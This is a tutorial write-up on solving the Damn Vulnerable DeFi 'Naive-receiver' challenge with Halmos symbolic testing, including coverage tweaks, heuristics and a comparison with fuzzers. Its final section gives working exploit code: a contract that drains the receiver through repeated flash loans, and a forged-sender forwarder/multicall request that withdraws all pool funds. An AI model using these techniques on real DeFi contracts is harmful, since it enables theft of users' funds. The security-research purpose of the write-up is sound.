# Halmos vs Naive-receiver
## Halmos version
halmos 0.2.1.dev19+g4e82a90 was used in this article
## Foreword
It is strongly assumed that the reader is familiar with the previous articles on solving ["Unstoppable"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/unstoppable) and ["Truster"](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster), since the main ideas here are largely repeated and we will not dwell on them again.
## Preparation
### Common prerequisites
1. Copy NaiveReceiver.t.sol file to NaiveReceiverHalmos.t.sol. We will work in this file.
2. Rename "test_naiveReceiver()" to "check_naiveReceiver()", so Halmos will execute this test symbolically.
3. Avoid using makeAddr() cheatcode:
    ```solidity
        address deployer = address(0xcafe0000);
        address recovery = address(0xcafe0002);
    ```
    In this task, for the first time, we have a player's private key in addition to the player address. However, we will ignore it, since we already know that Halmos is not good at cryptography. But we will behave as if we have this key in all places where it might be needed.
    ```solidity
    function setUp() public {
        //(player, playerPk) = makeAddrAndKey("player");
        player = address(0xcafe0001);
        ...
    ```
4. **vm.getNonce()** is an unsupported cheat-code. Delete it in **_isSolved()** function.
5. Create **GlobalStorage** contract and save all address-name pairs:
    ```solidity
    ...
    import "lib/GlobalStorage.sol";
    ...
    contract NaiveReceiverChallenge is Test {
    ...
        GlobalStorage glob;
        NaiveReceiverPool pool;
    ...
        function setUp() public {
            ...
            glob = new GlobalStorage();
            ...
            glob.add_addr_name_pair(address(weth), "WETH");
            glob.add_addr_name_pair(address(forwarder), "BasicForwarder");
            glob.add_addr_name_pair(address(pool), "NaiveReceiverPool");
            glob.add_addr_name_pair(address(receiver), "FlashLoanReceiver");
            vm.stopPrank();
        }
        ...
    }
    ```
6. Print all contract addresses, including the upcoming SymbolicAttacker:
    ```solidity
    function check_naiveReceiver() public checkSolvedByPlayer {
        ...
        SymbolicAttacker attacker = new SymbolicAttacker();
        console.log("GlobalStorage\t", address(glob));
        console.log("WETH\t\t", address(weth));
        console.log("BasicForwarder\t", address(forwarder));
        console.log("NaiveReceiverPool\t", address(pool));
        console.log("FlashLoanReceiver\t", address(receiver));
        console.log("attacker\t\t", address(attacker));
        ...
    ```
     ```javascript
    $ halmos --solver-timeout-assertion 0 --function check_naiveReceiver
    [console.log] GlobalStorage      0x00000000000000000000000000000000000000000000000000000000aaaa0002
    [console.log] WETH               0x00000000000000000000000000000000000000000000000000000000aaaa0003
    [console.log] BasicForwarder     0x00000000000000000000000000000000000000000000000000000000aaaa0004
    [console.log] NaiveReceiverPool  0x00000000000000000000000000000000000000000000000000000000aaaa0005
    [console.log] FlashLoanReceiver  0x00000000000000000000000000000000000000000000000000000000aaaa0006
    [console.log] attacker           0x00000000000000000000000000000000000000000000000000000000aaaa0007
    ```
### _isSolved() implementation
The original checks look like:
```solidity
// The flashloan receiver contract has been emptied
assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");
// Pool is empty too
assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");
// All funds sent to recovery account
assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
```
Then opposite assert is:
```solidity
assert( weth.balanceOf(address(receiver)) != 0 || 
        weth.balanceOf(address(pool)) != 0 || 
        weth.balanceOf(recovery) != WETH_IN_POOL + WETH_IN_RECEIVER);
```
## Improvement of coverage
Let's start with a single-transaction **SymbolicAttacker** to make sure all paths in target contracts are covered:
```solidity
function check_naiveReceiver() public checkSolvedByPlayer {
    ...
    attacker.attack();
}
```
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import "halmos-cheatcodes/SymTest.sol";
import "forge-std/Test.sol";
import "lib/GlobalStorage.sol";

contract SymbolicAttacker is Test, SymTest {
    // We can hardcode this address for convenience
    GlobalStorage glob = GlobalStorage(address(0xaaaa0002)); 

    function execute_tx() private {
        address target = svm.createAddress("target");
        bytes memory data;
        //Get some concrete target-name pair
        (target, data) = glob.get_concrete_from_symbolic(target);
        target.call(data);
    }

	function attack() public {
        execute_tx();
    }
}
```
### Issue #338
If we are trying to run Halmos in the current contracts state, it will fail:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_naiveReceiver
...
WARNING:halmos:path.append(false)
(see https://github.com/a16z/halmos/wiki/warnings#internal-error)
...
WARNING:halmos:check_naiveReceiver(): all paths have been reverted; the setup state or inputs may have been too restrictive.
(see https://github.com/a16z/halmos/wiki/warnings#revert-all)
[ERROR] check_naiveReceiver() (paths: 0, time: 0.07s, bounds: [])
```
This is a known Halmos [issue](https://github.com/a16z/halmos/issues/338) which has not yet been fixed at the time of writing. We will not delve into the very cause of this problem. I will say only that there is an easy bypass for it. Just change
```solidity
startHoax(deployer);
```
to
```solidity
startHoax(deployer, 1 << 80);
```
### Symbolic calldata refactoring
Let's practice using GlobalStorage again to replace the symbolic calldata call. We have 2 places with such call:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_naiveReceiver -vvvvv
...
Path #73:
...
Trace:
            [36mCALL[0m 0xaaaa0004::execute(Concat(0x00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000540, p_request.from_address_2a3a33c_04(), p_request.target_address_81de530_05(), p_request.value_uint256_2210ac7_06(), p_request.gas_uint256_e439f98_07(), p_request.nonce_uint256_914d5f0_08(), 0x00000000000000000000000000000000000000000000000000000000000000e0, p_request.deadline_uint256_db05164_11(), p_request.data_length_a924678_10(), p_request.data_bytes_1a6ece2_09(), p_signature_length_9c169ac_13(), p_signature_bytes_b128a84_12()))
                [36mSTATICCALL[0m 0xaaaa0005::trustedForwarder()[33m [static][0m
                ...
                [36mCALL[0m 0xaaaa0005::Extract(p_request.data_bytes_1a6ece2_09())(Concat(Extract(p_request.data_bytes_1a6ece2_09()), Extract(p_request.from_address_2a3a33c_04())))
                [31m↩ [0m[36mCALLDATALOAD[0m [31m0x[0m[31m (error: NotConcreteError('symbolic CALLDATALOAD offset: 4 + Extract(8159, 7904, p_request.data_bytes_1a6ece2_09)'))[0m
...
...
Path #222:
...
Trace:
...
            [36mCALL[0m 0xaaaa0005::multicall(Concat(0x0000000000000000000000000000000000000000000000000000000000000020, p_data_length_b01ff59_09(), 0x00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000460, p_data[0]_length_af6f818_11(), p_data[0]_bytes_4bddd90_10(), p_data[1]_length_9cf4186_13(), p_data[1]_bytes_d9323aa_12()))
            ...
            [36mDELEGATECALL[0m 0xaaaa0005::Extract(p_data[1]_bytes_d9323aa_12())(Extract(p_data[1]_bytes_d9323aa_12()))
            [31m↩ [0m[36mCALLDATALOAD[0m [31m0x[0m[31m (error: NotConcreteError('symbolic CALLDATALOAD offset: 4 + Extract(8159, 7904, p_data[1]_bytes_d9323aa_12)'))[0m
```
First symbolic calldata call is contained in **BasicForwarder::execute**:
```solidity
function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
    ...
    bytes memory payload = abi.encodePacked(request.data, request.from);
    ...
    assembly {
            success := call(forwardGas, target, value, add(payload, 0x20), mload(payload), 0, 0) // don't copy returndata
            gasLeft := gas()
        }
}
```
In fact, this is the familiar target-data call pattern. At the same time, we completely ignore the logic with gas, since Halmos does not count gas at all. We just assume that we always have enough gas. Therefore, we deal with it as we already know how:
```solidity
import "lib/GlobalStorage.sol";
...
contract BasicForwarder is EIP712 {
    GlobalStorage glob = GlobalStorage(address(0xaaaa0002));
    ...
    function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
        ...
        // Work with "newdata" like this is the "data"
        bytes memory newdata;
        // avoid recursion
        vm.assume(target != address(this));
        (target, newdata) = glob.get_concrete_from_symbolic(target);
        bytes memory payload = abi.encodePacked(newdata, request.from); // Don't forget about this packing
        target.call(payload);
    }
}
```
And the second such call is in **Multicall::multicall**:
```solidity
    function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
        results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            results[i] = Address.functionDelegateCall(address(this), data[i]);
        }
        return results;
    }
```
This is something new. Here we have not one call of symbolic calldata, but a whole batch. And, in fact, it is already much more difficult to cope with it. We remember how the test execution time increased dramatically when we added only 1 symbolic transaction in the previous challenge. Therefore, let's start with just one transaction instead of a full symbolic batch execution, but keep in mind that more may be needed:
```solidity
// symbolic multicall
function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
    results = new bytes[](1);
    address target = address(this);
    bytes memory newdata = svm.createCalldata("NaiveReceiverPool");
    // avoid recursion
    vm.assume (bytes4(newdata) != this.multicall.selector);
    results[0] = Address.functionDelegateCall(target, newdata);
    return results;
}
```
Let's run the check again:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_naiveReceiver
...
[PASS] check_naiveReceiver() (paths: 685, time: 124.43s, bounds: [])
WARNING:halmos:check_naiveReceiver(): paths have not been fully explored due to the loop unrolling bound: 2
(see https://github.com/a16z/halmos/wiki/warnings#loop-bound)
```
We are no longer bothered by the symbolic calldata offset, but another warning appeared.
### Increasing the loop limit
What this warning is saying is that we have a loop that needs too many iterations. By default, Halmos only performs 2 loop iterations. And since our **GlobalStorage** iterates over addresses (of which we transferred as many as 4), not all addresses were symbolically executed. So we will pass 1 more parameter when starting Halmos:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_naiveReceiver --loop 4
...
[PASS] check_naiveReceiver() (paths: 845, time: 58.14s, bounds: [])
Symbolic test result: 1 passed; 0 failed; time: 59.01s
```
Perfectly. The number of paths has increased, there are no more warnings. However, the invariant is still not broken, so we should proceed to the next step.
## Increasing transactions
We already know that if a problem cannot be solved in one transaction, we can try to solve it in several transactions. We are going in this direction. By analogy with **"Truster"**, let's just add another transaction to **SymbolicAttacker**:
```solidity
function execute_tx() private {
    address target = svm.createAddress("target");
    bytes memory data;
    //Get some concrete target-name pair
    (target, data) = glob.get_concrete_from_symbolic(target);
    target.call(data);
}

function attack() public {
    execute_tx();
    execute_tx();
}
```
```javascript
$ halmos --solver-timeout-assertion 0 --function check_naiveReceiver --loop 4
...
[console.log] GlobalStorage      0x00000000000000000000000000000000000000000000000000000000aaaa0002
[console.log] WETH               0x00000000000000000000000000000000000000000000000000000000aaaa0003
[console.log] BasicForwarder     0x00000000000000000000000000000000000000000000000000000000aaaa0004
[console.log] NaiveReceiverPool  0x00000000000000000000000000000000000000000000000000000000aaaa0005
[console.log] FlashLoanReceiver  0x00000000000000000000000000000000000000000000000000000000aaaa0006
[console.log] attacker           0x00000000000000000000000000000000000000000000000000000000aaaa0007
...
Killed
```
Catastrophe! An hour later, Halmos simply collapsed due to out-of-memory. This is a known problem of symbolic analysis: [Path Explosion](https://en.wikipedia.org/wiki/Path_explosion). Halmos could not handle the symbolic execution of 2 transactions in a setup with such 4 contracts.
## Optimizations
Here we have reached the Halmos limit, and it will not be possible to solve this problem so straightforwardly. We will have to introduce some optimizations.
### Cheats
Smart contract optimizations, which will be described below, require the use of Foundry cheat codes (from **Test**) and Halmos itself (from **SymTest**). Of course, we could just add inheritance from these smart contracts and it would work fine. But this will significantly change the bytecode of target smart contracts and there is a small risk of unwanted side effects. Therefore, to minimize the potential impact of optimizations on the behavior of target smart contracts, let's create the following abstract contract in `lib/Cheats.sol`:
```solidity
import "forge-std/Test.sol";
import "./halmos-cheatcodes/src/SymTest.sol";

abstract contract Cheats {
    Vm internal constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    SVM internal constant svm = SVM(address(uint160(uint256(keccak256("svm cheat code")))));
}
```
And we make inheritance from Cheats:
```solidity
contract BasicForwarder is EIP712, Cheats {
    ...
}
```
```solidity
abstract contract Multicall is Context, Cheats {
    ...
}
```
### onFlashLoan
First, let's look at **FlashLoanReceiver::onFlashLoan**:
```solidity
contract FlashLoanReceiver is IERC3156FlashBorrower {
    address private pool;
    ...
    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
    ...
    {
        assembly {
            // gas savings
            if iszero(eq(sload(pool.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }
    }
}
...
```
This function is the only function of this contract. In addition, it will not be executed if **msg.sender** is not **NaiveReceiverPool**. Therefore, we can safely delete **FlashLoanReceiver** from **GlobalStorage**. And next to that, we optimize the **NaiveReceiverPool** logic:
```solidity
contract NaiveReceiverPool is Multicall, IERC3156FlashLender {
...
    if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
    }
...
}
```
The only **IERC3156FlashBorrower** in our setup is **FlashLoanReceiver**. Therefore, let's make the solver's task easier:
```solidity
function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
    external
    returns (bool)
{
    vm.assume (address(receiver) == address(0xaaaa0006));
    ...
}
```
### _checkRequest
The next optimization is related to **BasicForwarder::_checkRequest**:
```solidity
function _checkRequest(Request calldata request, bytes calldata signature) private view {
    ...
    if (IHasTrustedForwarder(request.target).trustedForwarder() != address(this)) revert InvalidTarget();
    ...
}
```
The only contract for which BasicForwarder is a trusted Forwarder is NaiveReceiverPool. Therefore, the target in BasicForwarder can only be pool:
```solidity
function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
    ...
    // Work with "newdata" like this is the "data"
    bytes memory newdata = svm.createCalldata("NaiveReceiverPool");
    bytes memory payload = abi.encodePacked(newdata, request.from);
    vm.assume(target == address(0xaaaa0005));
    target.call(payload);
}
```
### Cryptographic checks
Next to it, there is a cryptographic check of the signature in **_checkRequest**:
```solidity
function _checkRequest(Request calldata request, bytes calldata signature) private view {
...
    address signer = ECDSA.recover(_hashTypedData(getDataHash(request)), signature);
    if (signer != request.from) revert InvalidSigner();
}
```
We already know that tools like Halmos don't do well with cryptographic checks, so we'll have to think logically here. 
Let's remember that under the condition of the problem, we have the player's private key, which we can use to sign forward transactions here. It turns out that the only **transfer.from** we can pass is the player's address:
```solidity
function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
...
vm.assume(request.from == address(0xcafe0001));
...
```
And in _checkRequest itself, we will remove these checks.

Try again:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_naiveReceiver --loop 3
...
killed
```
No, it's still too hard. 

### Small update
In newer versions of Halmos, the problem with the linear growth of memory and, as a result, out-of-memory crash has been fixed. Now this test takes a VERY LONG time to run, but at least it can finish running. However, it still cannot find a counterexample.

## Heuristics
We have reached the point where we can no longer operate with only stable improvements and expect Halmos to give us a solution to the problem in such a clear form as in past challenges. Will have to try to apply some relief by sacrificing likely scenarios that could be covered symbolically.
### Proxy heuristics
Since **BasicForwarder** is essentially just a proxy contract for **NaiveReceiverPool**, and **multicall** is in turn a proxy function for other pool functions, we can try to sacrifice scenarios where we call functions from NaiveReceiverPool directly. On the other hand, we get the benefit of not having duplicate symbolic calls to these functions, while not reducing overall code coverage:
```solidity
function setUp() public {
    ...
    glob.add_addr_name_pair(address(weth), "WETH");
    glob.add_addr_name_pair(address(forwarder), "BasicForwarder");
    // Exclude direct call to NaiveReceiverPool
    //glob.add_addr_name_pair(address(pool), "NaiveReceiverPool");
    ...
}
```
```solidity
function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
    ...
    bytes memory newdata = svm.createCalldata("NaiveReceiverPool");
    bytes memory payload = abi.encodePacked(newdata, request.from);
    vm.assume(target == address(0xaaaa0005));
    vm.assume(bytes4(newdata) == bytes4(keccak256("multicall(bytes[])")));
    target.call(payload);
}
```
### msg.data usage hint
Let's take a look at this piece of code in **NaiveReceiverPool**:
```solidity
function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder && msg.data.length >= 20) {
        return address(bytes20(msg.data[msg.data.length - 20:]));
        ...
}
```
Here, **msg.data** works like a normal byte array. In such cases, it is much better to use **svm.createBytes()** instead of **svm.CreateCalldata()**, if you call such a function symbolically, so that Halmos behaves more flexibly and can find more subtle bugs tied specifically to unexpected calldata crafting. The only place we can get here from is **multicall->withdraw**. Therefore, let's change our **multicall** somewhat:
```solidity
// symbolic multicall
function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
    ...
    bytes memory newdata = svm.createCalldata("NaiveReceiverPool");
    ...
    // If selector is "withdraw"
    if (selector == bytes4(keccak256("withdraw(uint256,address)")))
    {
        newdata = svm.createBytes(100, "multicall_newdata");
        vm.assume (bytes4(newdata) == selector);
    }
    results[0] = Address.functionDelegateCall(target, newdata);
    return results;
}
```
### A simplified invariant
So far, we have used invariants that directly gave us the solution to the problem. But if we cannot find a direct solution, we will apply other principles. First, let's remove the condition that the assets must be on recovery. Let's rationalize it by the fact that if we can find an attack at all that will steal funds from target addresses, the way to transfer them to recovery should be obvious. As a result, we will probably save on the number of necessary symbolic transactions:
```solidity
function _isSolved() private view {
    ...
    assert (weth.balanceOf(address(receiver)) != 0 || 
            weth.balanceOf(address(pool)) != 0); 
```
But let's go even further. Let's try to find out if we can reduce the target contract balances at all. Maybe that will give us an idea for an attack:
```solidity
function _isSolved() private view {
    assert (weth.balanceOf(address(pool)) >= WETH_IN_POOL || 
            weth.balanceOf(address(receiver)) >= WETH_IN_RECEIVER);
}
```
Run:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_naiveReceiver
...
Counterexample:
halmos_multicall_newdata_bytes_e2c4a17_67 = 0x00f714ce0000000000000000000000000000000000000000000000070800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000cafe0000
halmos_selector_bytes4_2b51260_47 = execute
halmos_selector_bytes4_acafed2_66 = withdraw
halmos_selector_bytes4_e0bb9db_14 = execute
halmos_selector_bytes4_f3c1dfe_33 = flashLoan
halmos_target_address_2eb5185_01 = 0x00000000000000000000000000000000aaaa0004
halmos_target_address_a486edd_34 = 0x00000000000000000000000000000000aaaa0004
p_amount_uint256_53924bb_28 = 0x0000000000000000000000000000000000000000000000077400000000000000
p_data_length_1638d62_30 = 0x0000000000000000000000000000000000000000000000000000000000000400
p_receiver_address_3b7cd58_26 = 0x00000000000000000000000000000000000000000000000000000000aaaa0006
p_request.from_address_d094f2c_04 = 0x00000000000000000000000000000000000000000000000000000000cafe0001
p_request.from_address_fa75348_37 = 0x00000000000000000000000000000000000000000000000000000000cafe0001
p_request.target_address_9cc3344_05 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
p_request.target_address_c287625_38 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
p_signature_length_7e37d64_13 = 0x0000000000000000000000000000000000000000000000000000000000000041
p_signature_length_fb058e7_46 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_token_address_a8696b9_27 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
...
[FAIL] check_naiveReceiver() (paths: 20371, time: 1592.14s, bounds: [])
```
Counterexample is found!
### Another way
Before proceeding to the analysis of the counterexample, it is worth saying that a similar result could have been achieved in an easier way. Instead of sacrificing possible scenarios, we could sacrifice the number of symbolic transactions executed (executing only one symbolic transaction), simplifying the invariant even more. We could try to "bite in small pieces" and find these invariant counterexamples independently of each other. So
1. Return **NaiveReceiverPool** to **GlobalStorage**
    ```solidity
    glob.add_addr_name_pair(address(weth), "WETH");
    glob.add_addr_name_pair(address(forwarder), "BasicForwarder");
    glob.add_addr_name_pair(address(pool), "NaiveReceiverPool");
    ```
2. Let's go back to the single symbolic transaction
    ```solidity
    function attack() public {
        execute_tx();
        //execute_tx();
    }
    ```
3. Split invariants
    ```solidity
    function _isSolved() private view {
        assert (weth.balanceOf(address(pool)) >= WETH_IN_POOL);
        assert (weth.balanceOf(address(receiver)) >= WETH_IN_RECEIVER);
    }
    ```
Run:
```javascript
$ halmos --solver-timeout-assertion 0 --function check_naiveReceiver --loop 3
...
Counterexample:
halmos_selector_bytes4_0f6d90c_16 = flashLoan
halmos_target_address_b163b06_01 = 0x00000000000000000000000000000000aaaa0005
p_amount_uint256_0638d47_06 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_data_length_98af919_08 = 0x0000000000000000000000000000000000000000000000000000000000000000
p_receiver_address_61d6d2d_04 = 0x00000000000000000000000000000000000000000000000000000000aaaa0006
p_token_address_383970d_05 = 0x00000000000000000000000000000000000000000000000000000000aaaa0003
...
Counterexample:
halmos_multicall_newdata_bytes_4d9e59c_44 = 0x00f714ce00000000000000000000000000000000000000000000003635c9adc5dea00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000cafe0000
halmos_selector_bytes4_2d91fe2_43 = withdraw
halmos_selector_bytes4_ee6acf1_14 = execute
halmos_target_address_b163b06_01 = 0x00000000000000000000000000000000aaaa0004
p_data_length_b44e459_22 = 0x0000000000000000000000000000000000000000000000000000000000000002
p_request.from_address_54c3352_04 = 0x00000000000000000000000000000000000000000000000000000000cafe0001
p_request.target_address_a92dbac_05 = 0x00000000000000000000000000000000000000000000000000000000aaaa0005
p_signature_length_8d509fd_13 = 0x0000000000000000000000000000000000000000000000000000000000000400
```
## Counterexamples analysis
Note that 2 bugs were found here at once.
The mechanics of the first bug are quite simple - we launch **flashLoan**, as the receiver we specify the **FlashLoanReceiver** contract, which we do not own, thereby emptying it by 1 **WETH** per transaction. Precisely because it takes 10 such transactions to empty this balance to 0 - Halmos failed with a clearer invariant.
The mechanics of the second bug are very interesting. The fact is that for this we need to fulfill 2 conditions: run **withdraw** with **Forwarder** as a **msg.sender**, but at the same time bypass the concatenation of our address at the end of the **payload**:
```solidity
bytes memory payload = abi.encodePacked(newdata, request.from);
...
target.call(payload);
```
```solidity
if (msg.sender == trustedForwarder && msg.data.length >= 20) {
    return address(bytes20(msg.data[msg.data.length - 20:]));
}
```
And Halmos did find a scenario: it needs to be called from under multicall, which will allow us to withdraw on behalf of the **Forwarder** (via **delegateCall**), while withdrawing funds to an arbitrary receiver, emptying the balance of an arbitrary address, inserting it at the end of data. For this we needed the hint from **svm.createBytes()** earlier.
## Using a counterexample
Let's use the **attacker** to devastate the **FlashLoanReceiver**:
```solidity
pragma solidity =0.8.25;

import {NaiveReceiverPool, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";

contract Attacker {
    function attack(NaiveReceiverPool pool, FlashLoanReceiver receiver, WETH weth) public {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, address(weth), 1, "b1bab0ba");
        }
    }
} 
```
```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    Attacker attacker = new Attacker();
    attacker.attack(pool, receiver, weth);
    ...
}
```
Now we send all pool funds to recovery. We remember that we ignored the player's private key when testing through Halmos. The real attack, of course, requires us to craft a valid request to the **Forwarder**. This time we won't use an **attacker** contract. We don't want to transfer our private key to some contract :)
```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
...
    bytes[] memory callDatas = new bytes[](1);
    callDatas[0] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
        bytes32(uint256(uint160(deployer)))
    );
    bytes memory callData;
    callData = abi.encodeCall(pool.multicall, callDatas);
    BasicForwarder.Request memory request = BasicForwarder.Request(
        player,
        address(pool),
        0,
        30000000,
        forwarder.nonces(player),
        callData,
        1 days
    );
    bytes32 requestHash = keccak256(
        abi.encodePacked(
            "\x19\x01",
            forwarder.domainSeparator(),
            forwarder.getDataHash(request)
        )
    );
    (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
    bytes memory signature = abi.encodePacked(r, s, v);
    require(forwarder.execute(request, signature));
}
```
Since we crafted the request ourselves, because we couldn't use calldata from Halmos for obvious reasons - I just copied this request from [here](https://medium.com/@opensiddhu993/challenge-2-naive-receiver-damn-vulnerable-defi-v4-lazy-solutions-series-8b3b28bc929d) by [@siddharth9903](https://github.com/siddharth9903) :).

```javascript
$ forge test -vv --mp test/naive-receiver/NaiveReceiver.t.sol
...
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 2.53ms (1.50ms CPU time)
```
Did it!
## Compare with fuzzing
We can find foundry-based, echidna-based and meduza-based solutions to this problem [here](https://github.com/devdacian/solidity-fuzzing-comparison/tree/main/test/01-naive-receiver).
However, I haven't found any solutions for the updated version of Naive-receiver (v4). The fact is that a second bug was added in the new version, which is tied precisely to the calldata craft and in **"Truster"** it almost became a blocker. Therefore, let's check whether there are fuzzers at all are able to work out the following logic.
### Target
First, write this POCTarget contract:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

contract POCTarget {
    uint256 public a;
    
    constructor() {
        a = 0;
    }

    function proxycall (bytes calldata data) public {
        address(this).call(data);
    }

    function changea () public {
        if (msg.sender != address(this)) {
            revert();
        }
        if (address(bytes20(msg.data[msg.data.length - 20:])) == address(this)) {
            a = 1;
        }
    }
}
```
If the fuzzer supports such logic, it will find a counterexample where a==1.
### Foundry
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import "./POCTarget.sol";
import {Test, console} from "forge-std/Test.sol";

contract POCFuzzing is Test {
    POCTarget target;
    address deployer = makeAddr("deployer");

    function setUp() public {
        startHoax(deployer);
        target = new POCTarget();
        vm.stopPrank();
        targetSender(deployer);
    }

    function invariant_isWorking() public {
        assert (target.a() != 1);
    }
}
```
```javascript
$ forge test -vv --mp test/naive-receiver/POCFuzzing.t.sol
...
[PASS] invariant_isWorking() (runs: 1000, calls: 500000, reverts: 249958)
```
Not working
### Echidna
```javascript
deployer: '0xcafe0001' 
sender: ['0xcafe0002']
allContracts: true
workers: 8
```
```solidity
// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import "./POCTarget.sol";
import {Test, console} from "forge-std/Test.sol";

contract POCFuzzing is Test {
    POCTarget target;
    address deployer = makeAddr("deployer");

    constructor() public payable {
        target = new POCTarget();
    }

    function echidna_isWorking() public returns (bool) {
        return target.a() != 1;
    }
}
```
```javascript
echidna test/naive-receiver/POCEchidna.t.sol --contract POCEchidna --config test/naive-receiver/naive-receiver.yaml --test-limit 10000000
...
echidna_isWorking: passing
...
```
Also not working. I think these results are enough to prove that Foundry and Echidna fuzzing would not cope with the new bug.
## Conclusions
1. Path explosion is a really serious problem of symbolic analysis. We had a setup of 4 not the largest contracts, but Halmos was unable to complete 2 transactions symbolically without serious simplifications.
2. You can and should use simplifications and optimizations. Sometimes nothing will work without it. The main thing is to choose heuristics successfully.
3. When creating invariants, you can follow the principle "If we can do something UNEXPECTED - we will easily find a full-fledged attack".
4. It is important to understand when it is better to use **svm.CreateCalldata()** and when to use **svm.createBytes()**. Each has its own unique areas of application.
5. Even given that we gave a strong hint that **svm.createBytes()** should be used at **withdraw->_msgSender()** function, Halmos did a great job of handling the raw calldata to find a bug, unlike Echidna and Foundry. The new version of Naive-receiver is not completely solved by fuzzing.
## What's next?
Next DVD challenge is [Side-entrance](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/side-entrance).
